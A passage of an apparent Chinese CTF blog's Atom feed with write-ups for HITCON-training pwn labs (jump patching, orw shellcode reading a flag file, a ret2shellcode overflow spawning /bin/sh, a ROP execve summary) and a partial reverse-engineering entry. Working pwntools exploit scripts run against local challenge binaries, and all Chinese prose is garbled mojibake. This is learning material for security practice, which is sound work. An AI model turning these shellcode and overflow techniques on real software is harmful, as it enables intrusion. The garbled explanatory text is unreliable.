class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd043f350073.png" alt=""></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å†…å®¹æ¶‰åŠ: libcæ³„éœ²ï¼Œleak libcåŸºåœ°å€ï¼Œropchainç³»ç»Ÿè°ƒç”¨ï¼ˆint 0x80ï¼‰ã€‚</p><p>ropchainç³»ç»Ÿè°ƒç”¨åŸç†ï¼šåœ¨æ— systemå‡½æ•°ï¼Œ/bin/shå¯ç”¨çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¸€ç³»åˆ— pop|ret ç­‰gadgetï¼Œä½¿å¾— eax = 0xbï¼ˆexecve 32 ä½ä¸‹çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œebx -&gt; /bin/shï¼Œ ecx = edx = 0ï¼Œç„¶åé€šè¿‡ <code>int 0x80</code> å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(â€œ/bin/shâ€, 0, 0)ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10æœˆ24-hitcon-äºŒ&quot;&gt;&lt;a href=&quot;#Pwn-10æœˆ24-hitcon-äºŒ&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10æœˆ24-hitcon(äºŒ)&quot;&gt;&lt;/a&gt;Pwn-10æœˆ24-hitcon(äºŒ
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ23-Hitcon(ä¸€)</title>
    <link href="http://www.yof3ng.xyz/2018/10/23/Pwn-10%E6%9C%8823-Hitcon-%E4%B8%80/"/>
    <id>http://www.yof3ng.xyz/2018/10/23/Pwn-10æœˆ23-Hitcon-ä¸€/</id>
    <published>2018-10-23T10:52:55.000Z</published>
    <updated>2018-10-23T14:25:36.272Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10æœˆ23-Hitcon-ä¸€"><a href="#Pwn-10æœˆ23-Hitcon-ä¸€" class="headerlink" title="Pwn-10æœˆ23-Hitcon(ä¸€)"></a>Pwn-10æœˆ23-Hitcon(ä¸€)</h1><blockquote><p>ç»§ç»­äºŒè¿›åˆ¶ä¿®ç‚¼ï¼Œä»Šå¤©å¼€å§‹è‚Hiton-trainingï¼Œè†œç€<a href="https://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">m4x</a>ï¼Œä»¥åŠå¦ä¸€ä½å¤§ä½¬<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">23R3F</a>çš„é¢˜è§£è¹’è·šå‰è¡Œã€‚</p></blockquote><h2 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h2><blockquote><p>è²Œä¼¼ç¬¬ä¸€é¢˜ä¼šæ¯”è¾ƒç®€å•ï¼Œå…ˆç”¨IDA-Proé™æ€åˆ†æä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf0b64c261c.png" alt=""></p><p>è²Œä¼¼ç›´æ¥å¾—åˆ°äº†ä¸€ä¸ªèƒ½å¤Ÿè¾“å‡ºflagçš„å‡½æ•°ï¼Ÿç”±äºè¿™æ˜¯ä¸ªelf32ä½å¯æ‰§è¡Œæ–‡ä»¶æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨linuxä¸‹é¢æ‰§è¡Œï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf0332abc98.png" alt=""></p><p>å¯ä»¥å¾ˆç®€å•å°±çœ‹æ‡‚é€»è¾‘ï¼Œè¾“å…¥ä¸€ä¸ªå€¼ï¼Œç„¶åæ¯”è¾ƒå¦‚æœç›¸ç­‰ï¼Œå¾—å‡ºflagã€‚</p></blockquote><h3 id="è§£æ³•1-patch"><a href="#è§£æ³•1-patch" class="headerlink" title="è§£æ³•1 - patch"></a>è§£æ³•1 - patch</h3><blockquote><p>IDA Pro â€“ keypatchï¼Œä½¿ç”¨<code>keypatch</code>æ’ä»¶æ¥ä¿®æ”¹æ±‡ç¼–ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å…³é”®çš„ä¸€æ­¥nopæ‰æˆ–è€…æ”¹æˆå®Œå…¨ç›¸åçš„æ“ä½œã€‚</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf05f6b8d06.png" alt=""></p><blockquote><p>ä¾‹å¦‚å°†<code>.text:08048722</code>çš„è·³è½¬æ±‡ç¼–æŒ‡ä»¤æ”¹ä¸ºjmpæ— æ¡ä»¶è·³è½¬ï¼Œæˆ–è€…æ˜¯ä¸jnzç›¸åçš„jzæ“ä½œã€‚</p><p><img src="https://i.loli.net/2018/10/23/5bcf075963ea4.png" alt=""></p><p><img src="https://i.loli.net/2018/10/23/5bcf07b5548dc.png" alt=""></p><p>ä¿®æ”¹ä¸ºæ— æ¡ä»¶è·³è½¬åéœ€è¦å°†å…¶ä¿å­˜åˆ°å¯¹åº”æ–‡ä»¶ä¸­ï¼š<br><img src="https://i.loli.net/2018/10/23/5bcf07f4c58d9.png" alt=""></p><p>ç„¶åå»æŠŠæ–‡ä»¶æŒªåˆ°linuxä¸Šè¿è¡Œè¯•è¯•å‘ç°å¹¶æ²¡æœ‰ç”¨ï¼Œå› ä¸ºæ”¹ä¸ºjmpåå…¶å‡½æ•°ç›´æ¥å°‘äº†ä¸€éƒ¨åˆ†å¯¹flagçš„æ“ä½œï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf0a2f45481.png" alt=""></p><p>æ‰€ä»¥æˆ‘ä»¬åªèƒ½å°†åŸæ ·æœ¬ä¸­çš„jnzæ”¹ä¸ºjzäº†ï¼Œæ”¹å®Œä¹‹åå‡½æ•°å·²ç»æˆä¸ºä¸ç­‰åˆ™è¾“å‡ºflagäº†ï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf0bd4dce1d.png" alt=""></p><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf0c1461b1f.png" alt=""></p></blockquote><h3 id="è§£æ³•2-gdb-set-register-value"><a href="#è§£æ³•2-gdb-set-register-value" class="headerlink" title="è§£æ³•2 - gdb set register value"></a>è§£æ³•2 - gdb set register value</h3><blockquote><p>é€šè¿‡gdbåŠ¨æ€è°ƒè¯•ï¼Œå¹¶ä¸”åœ¨å³å°†è¿›è¡Œæ¯”è¾ƒå‰ï¼Œå°† eaxç½®ä¸ºä¸edxç›¸åŒçš„å€¼å³å¯ï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf0e78806d2.png" alt=""></p><p>ç„¶åå³å¯å¾—åˆ°flagã€‚</p></blockquote><h2 id="lab2-orw"><a href="#lab2-orw" class="headerlink" title="lab2-orw"></a>lab2-orw</h2><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec orw.bin</code>ï¼Œé¢˜ç›®orwçš„æ„æ€æ˜¯openï¼Œreadï¼Œwriteè¿™ä¸‰ä¸ªå‡½æ•°ã€‚</p><p><img src="https://i.loli.net/2018/10/23/5bcf0fca60256.png" alt=""></p><p>emmmè¿™æ˜¯æˆ‘åšçš„ç¬¬ä¸€ä¸ªå¼€å¯äº†Stackä¿æŠ¤çš„é¢˜ç›®å‘¢ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>ç®€å•è·‘ä¸€ä¸‹å¯ä»¥çœ‹åˆ°ç›´æ¥æ˜¯è®©ä½ è¾“å…¥shellcodeï¼š<br><img src="https://i.loli.net/2018/10/23/5bcf104eea350.png" alt=""></p><p>æ”¾IDA proé‡Œé¢çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf15e2dd0aa.png" alt=""></p><p>ç»†çœ‹ä¸€ä¸‹<code>orw_seccomp()å‡½æ•°</code>:</p><p><img src="https://i.loli.net/2018/10/23/5bcf16ed762fb.png" alt=""></p><p>prctlå‡½æ•°åˆæ˜¯å•¥ç©æ„å„¿ï¼ŸPrctl(ç”¨æˆ·å’Œå†…æ ¸æ²Ÿé€šçš„ä¸€ä¸ªç»ä½³å‡½æ•°),è¿™ä¸ªå‡½æ•°å¯ä»¥å¯¹è¿›ç¨‹è¿›è¡Œä¸€äº›è®¾ç½®ã€‚<a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">è€Œæœ‰ä¸€é“å¼ºç½‘æ¯é¢˜ç›®å°±å¥½åƒç”¨äº†è¿™ç©æ„å„¿çš„æŠ€æœ¯ï¼Ÿ</a></p><p>è¾“å…¥shellcodeä¹‹ååº”è¯¥ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥è¿™é¢˜çš„ç›®çš„æ˜¯è®©æˆ‘ä»¬è‡ªå·±æ„é€ shellcodeå»è¯»å–flagï¼Ÿæ—¢ç„¶è¦æ„é€ shellcodeï¼Œé‚£å°±éœ€è¦ç”¨åˆ°pwntoolsçš„asmæ¨¡å—å’Œshellcraftæ¨¡å—ï¼š</p><p>asmæ¨¡å—æ˜¯å°†æ“ä½œè½¬æ¢ä¸ºæ±‡ç¼–å‘½ä»¤ï¼Œè€Œshellcraftæ˜¯å…·æœ‰å„ç§å‡½æ•°å¯¹åº”æ±‡ç¼–å‘½ä»¤çš„ä¸€ä¸ªæ¨¡å—ï¼Œååˆ†å¥½ç”¨ï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf1996469a4.png" alt=""></p><p>pwntoolsä¸­çš„contextæ¨¡å—åˆæ˜¯ç”¨æ¥å¹²å˜›çš„å‘¢ï¼Ÿ</p><p><code>context</code>æ˜¯pwntoolsç”¨æ¥è®¾ç½®ç¯å¢ƒçš„åŠŸèƒ½ã€‚åœ¨å¾ˆå¤šæ—¶å€™ï¼Œç”±äºäºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸åŒï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦è¿›è¡Œä¸€äº›ç¯å¢ƒè®¾ç½®æ‰èƒ½å¤Ÿæ­£å¸¸è¿è¡Œexpï¼Œæ¯”å¦‚æœ‰ä¸€äº›éœ€è¦è¿›è¡Œæ±‡ç¼–ï¼Œä½†æ˜¯32çš„æ±‡ç¼–å’Œ64çš„æ±‡ç¼–ä¸åŒï¼Œå¦‚æœä¸è®¾ç½®contextä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ã€‚</p><p>ä¾‹å¦‚<code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code></p><p>è¿™å¥è¯çš„æ„æ€æ˜¯ï¼š </p><ol><li>osè®¾ç½®ç³»ç»Ÿä¸ºlinuxç³»ç»Ÿï¼Œåœ¨å®Œæˆctfé¢˜ç›®çš„æ—¶å€™ï¼Œå¤§å¤šæ•°pwné¢˜ç›®çš„ç³»ç»Ÿéƒ½æ˜¯linux </li><li>archè®¾ç½®æ¶æ„ä¸ºamd64ï¼Œå¯ä»¥ç®€å•çš„è®¤ä¸ºè®¾ç½®ä¸º64ä½çš„æ¨¡å¼ï¼Œå¯¹åº”çš„32ä½æ¨¡å¼æ˜¯â€™i386â€™ </li><li>log_levelè®¾ç½®æ—¥å¿—è¾“å‡ºçš„ç­‰çº§ä¸ºdebugï¼Œè¿™å¥è¯åœ¨è°ƒè¯•çš„æ—¶å€™ä¸€èˆ¬ä¼šè®¾ç½®ï¼Œè¿™æ ·pwntoolsä¼šå°†å®Œæ•´çš„ioè¿‡ç¨‹éƒ½æ‰“å°ä¸‹æ¥ï¼Œä½¿å¾—è°ƒè¯•æ›´åŠ æ–¹ä¾¿ï¼Œå¯ä»¥é¿å…åœ¨å®ŒæˆCTFé¢˜ç›®æ—¶å‡ºç°ä¸€äº›å’ŒIOç›¸å…³çš„é”™è¯¯ã€‚</li></ol></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>æ ¹æ®é¢˜æ„å’Œé¢˜è§£ğŸ˜‚ï¼ˆæ­£å¤„äºæ¶¨å§¿åŠ¿çš„æ—¶å€™ï¼‰å†™å‡ºexpï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> shellcraft <span class="token keyword">as</span> sccontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> sc<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span><span class="token string">"/home/xiaoyifeng/ctf/pwn/Hiton/lab2/flag"</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"esp"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  openè¿”å›çš„æ–‡ä»¶æ–‡ä»¶æè¿°ç¬¦å­˜è´®åœ¨eaxå¯„å­˜å™¨é‡Œ </span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"eax"</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  openè¯»å–çš„å†…å®¹æ”¾åœ¨æ ˆé¡¶ </span><span class="token comment" spellcheck="true">#  writeå‡½æ•°åœ¨æ ˆé¡¶è¯»å–0x100å¤§å°çš„å†…å®¹å¹¶æ‰“å°å‡ºæ¥</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./orw.bin"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(asm(shellcode))</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf2cbec3db2.png" alt=""></p><h2 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h2><blockquote><p>é¢˜ç›®åæ˜¯return to shellcodeçš„ç®€å†™ï¼Œåº”è¯¥æ˜¯åˆ©ç”¨returnè¿”å›ç„¶åæ‰§è¡Œshellcodeä¹‹ç±»çš„æ“ä½œï¼Ÿ</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec ret2sc</code></p><p><img src="https://i.loli.net/2018/10/23/5bcf21774fa88.png" alt=""></p><p>emmmæ²¡æœ‰å¼€å¯å•¥ä¿æŠ¤ï¼Œæ²¡æœ‰å¼€å¯æ ˆæº¢å‡ºæ£€æµ‹ï¼Œä¹Ÿæ²¡æœ‰å¼€å¯æ ˆä¸å¯æ‰§è¡Œï¼ˆNXï¼‰ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ-1"><a href="#é€»è¾‘åˆ†æ-1" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>è·‘ä¸€ä¸‹å‘ç°è®©æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²åˆ°Nameé‡Œé¢ï¼Œè¿˜æœ‰ä¸€ä¸ªtry your bestï¼Ÿé¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¼šä¸ä¼šåˆæ˜¯å•¥æ ˆæº¢å‡ºä»€ä¹ˆçš„ã€‚</p></blockquote><blockquote><p> <img src="https://i.loli.net/2018/10/23/5bcf212fdd23f.png" alt=""></p></blockquote><blockquote><p>å—¯ï¼Œæƒ…å†µæ˜¯æœ‰çš„ï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf22016964b.png" alt=""></p><p>é€šè¿‡gdbåŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç°åœ¨è¾“å…¥try your best çš„å€¼çš„æ—¶å€™å¯ä»¥å‘ç”Ÿæº¢å‡ºï¼Œå¹¶ä¸”å°†EIPæŒ‡å‘æˆ‘ä»¬æ„é€ çš„ä½ç½®ï¼š</p><p><img src="https://i.loli.net/2018/10/23/5bcf25189cf77.png" alt=""></p><p>è€Œè¿™ä¸ªä¸´ç•Œå€¼æˆ‘ä»¬å¯ä»¥é€šè¿‡pattern searchæ¥æŸ¥æˆ‘ä»¬æ„é€ çš„patternåç§»é‡ï¼Œå¾—åˆ°ä¸º32ã€‚æ ¹æ®å¤§ä½¬çš„é¢˜è§£äº†è§£åˆ°return to shellcodeæ˜¯ä¸€ç§é¢˜å‹ï¼Œæˆ‘ç”šè‡³æƒ³åˆ°äº†åˆç”¨ROP chain???<code>é»‘äººé—®å·.jpg</code>ğŸ˜­ã€‚</p><p>åŸæ¥return to shellcodeçš„æ“ä½œå°±æ˜¯å°†shellcodeå†™å…¥nameå˜é‡ç©ºé—´ï¼Œç„¶åé€šè¿‡è¿”å›åˆ°è¯¥åœ°å€ä»è€Œæ‰§è¡Œshellcode(NXæœªå¼€å¯ï¼Œæ ˆå¯æ‰§è¡Œ)</p><p><img src="https://i.loli.net/2018/10/23/5bcf2a86e5630.png" alt=""></p><p>è¯¥å˜é‡åœ°å€ä¸º0x804A060</p></blockquote><h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><blockquote><p>è¿™ä¸ªexpéœ€è¦ç”¨åˆ°shellcraftå’Œasmï¼Œæ¥å°†shellcodeè½¬ä¸ºæ±‡ç¼–æŒ‡ä»¤ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2sc"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#è·å¾—shçš„å‘½ä»¤å¤šç§å¤šæ ·ï¼Œå¹¶ä¸”æœ‰ä¸åŒç³»ç»Ÿç‰ˆæœ¬çš„sh</span><span class="token comment" spellcheck="true">#shellcode = asm(shellcraft.execve("/bin/sh"))</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flatæ¨¡å—èƒ½å°†patternå­—ç¬¦ä¸²å’Œåœ°å€ç»“åˆå¹¶ä¸”è½¬ä¸ºå­—èŠ‚æ¨¡å¼</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x804a060</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf2c13d7442.png" alt=""></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å†…å®¹æ¶‰åŠ context æ¨¡å¼è®¾ç½®ï¼Œasmæ¨¡å—ï¼Œshellcraftæ¨¡å—ï¼Œpatchæ“ä½œï¼Œreturn to shellcodeé¢˜å‹ï¼Œpwntools flatæ¨¡å—ã€‚</p><p>ä»Šå¤©å…ˆæ··åˆ°è¿™å„¿ã€‚ã€‚ã€‚æˆ‘çœŸèœğŸ˜­ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10æœˆ23-Hitcon-ä¸€&quot;&gt;&lt;a href=&quot;#Pwn-10æœˆ23-Hitcon-ä¸€&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10æœˆ23-Hitcon(ä¸€)&quot;&gt;&lt;/a&gt;Pwn-10æœˆ23-Hitcon(ä¸€
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Re-10æœˆ22-shiyanbar-10000</title>
    <link href="http://www.yof3ng.xyz/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/"/>
    <id>http://www.yof3ng.xyz/2018/10/22/Re-10æœˆ22-shiyanbar-10000/</id>
    <published>2018-10-22T06:23:30.000Z</published>
    <updated>2018-10-22T08:58:01.248Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Re-10æœˆ22-shiyanbar-10000"><a href="#Re-10æœˆ22-shiyanbar-10000" class="headerlink" title="Re-10æœˆ22-shiyanbar-10000"></a>Re-10æœˆ22-shiyanbar-10000</h1><blockquote><p>emmmè®°å½•ä¸€ä¸‹å®éªŒå§é‡Œä¸€é“ç®€å•çš„é€†å‘ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ç§æ€ç»´æ–¹å¼ã€‚</p></blockquote><blockquote><p>æ‹¿åˆ°ä¸€ä¸ªexeæ–‡ä»¶,è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd6ebe22927.png" alt=""></p><p>å¯¹æ²¡é”™å°±æ˜¯ä¸€ä¸ªå–µå­—ï¼Œç„¶åè¾“å…¥å†…å®¹ï¼Œä¼šè¾“å‡ºwrongï¼Œå¯ä»¥çŒœæµ‹è¾“å…¥äº†æ­£ç¡®çš„å­—ç¬¦åä¼šè¾“å‡ºgoodã€‚</p></blockquote><h2 id="é™æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#é™æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="é™æ€åˆ†æç¨‹åºé€»è¾‘"></a>é™æ€åˆ†æç¨‹åºé€»è¾‘</h2><blockquote><p>ä»¤äººç»æœ›çš„æ˜¯ï¼Œida6.8å’Œida7.0å¯¹æ­¤ç¨‹åºmainå‡½æ•°åˆ†æçš„ä¼ªä»£ç å±…ç„¶ä¸åŒï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹7.0çš„ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd72ad9ac34.png" alt=""></p><p>ç®€å•åˆ†æå¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œæ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥æŒ‰å­—èŠ‚ä¸0x80uè¿›è¡Œæˆ–æ“ä½œï¼Œå³æŒ‰ä½æˆ–ï¼Œç„¶åå¯¹å¤„ç†åçš„å†…å®¹è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œç„¶åå¾—å‡ºç»“æœã€‚ä¸Šå›¾ä¸­çš„v4åˆ°v16å®é™…ä¸Šéƒ½æ˜¯ä¸‹å›¾ä¸­çš„16è¿›åˆ¶è½¬ä¸ºæ•´å‹çš„å†…å®¹ï¼Œå› ä¸ºä¸€ä¸ªå­—èŠ‚å¯ä»¥è¡¨ç¤ºçš„æ•°å­—èŒƒå›´ä¸º-128åˆ°127ã€‚</p><p><img src="https://i.loli.net/2018/10/22/5bcd71a486530.png" alt=""></p><p>ç„¶åæˆ‘å°±è¦å‚»é€¼ğŸ˜­åœ°è¯´ï¼Œè¿™äº›å†…å®¹è‚¯å®šè·Ÿæ¯”è¾ƒæ˜¯æœ‰å…³ç³»çš„ã€‚</p><p>è¯•è¯•å°†0xe6ä¸0x80</p><p>æˆ‘ä»¬æ³¨æ„åˆ°<code>.text:004013F8</code>ä½ç½®çš„å‘½ä»¤æ˜¯å°†eaxä¸0xFFFFFF80ç›¸æˆ–ï¼Œä¸ºå•¥æˆ‘ä»¬çš„ä¼ªä»£ç ä¸­å´æ˜¯ä¸0x80uç›¸æˆ–å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬æ˜¯æŒ‰å­—èŠ‚æ¥è¿›è¡Œæˆ–æ“ä½œï¼Œæ‰€ä»¥0xFFFFFF80å‰é¢çš„ä¸‰ä¸ªå­—èŠ‚ä¹Ÿå°±æ²¡æœ‰äº†å¿…è¦ã€‚</p><p>å”‰å®åœ¨æ˜¯è¿™é¢˜ç›®é€»è¾‘å¤ªå«ç³Šä¸æ¸…ï¼ˆå¯èƒ½æ˜¯æˆ‘å¤ªèœâ”­â”®ï¹â”­â”®ï¼‰</p></blockquote><h2 id="åŠ¨æ€ç¨‹åºé€»è¾‘åˆ†æ"><a href="#åŠ¨æ€ç¨‹åºé€»è¾‘åˆ†æ" class="headerlink" title="åŠ¨æ€ç¨‹åºé€»è¾‘åˆ†æ"></a>åŠ¨æ€ç¨‹åºé€»è¾‘åˆ†æ</h2><blockquote><p>é€šè¿‡ollydbgæˆ‘ä»¬æ¥è¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œé¦–å…ˆè½½å…¥ç¨‹åºï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd7825508d0.png" alt=""></p><p>ç„¶åæˆ‘ä»¬æ‰¾ä¸€ä¸‹â€å–µâ€ï¼Œå‡ºç°çš„ä½ç½®ï¼Œå¹¶ä¸”åœ¨æ‰¾åˆ°çš„å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°ä¸‹æ–­ç‚¹ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd78b3669b0.png" alt=""></p><p>ç„¶åè¿è¡Œï¼Œå¹¶ä¸”éšä¾¿è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd790b40671.png" alt=""></p><p>æ ˆä¸­å‡ºç°äº†ä¸¤ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒçš„æ•°æ®ï¼Œåœ¨æ•°æ®çª—å£è·Ÿéšï¼Œå¯ä»¥å‘ç°s2ä¸º13ä¸ªå­—èŠ‚ï¼Œæ­£å¥½å¯¹åº”å‰é¢çš„é‚£13ä¸ªæ•°æ®</p><p><img src="https://i.loli.net/2018/10/22/5bcd79f764ec2.png" alt=""></p><p>ä½†æ˜¯å…‰é è¿™äº›ä¿¡æ¯æˆ‘ä»¬èƒ½æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„ç­”æ¡ˆå—ï¼Ÿæˆ‘ä»¬å¯ä»¥å¯¹s1è¿›è¡Œä¸€äº›æ“ä½œï¼Œä¹‹å‰è¾“å…¥çš„å­—ç¬¦ä¸²ä¸º<code>helloword æˆ–æ“ä½œå¤„ç†å==&gt; E8 E5 EC EC EF F7 EF F2 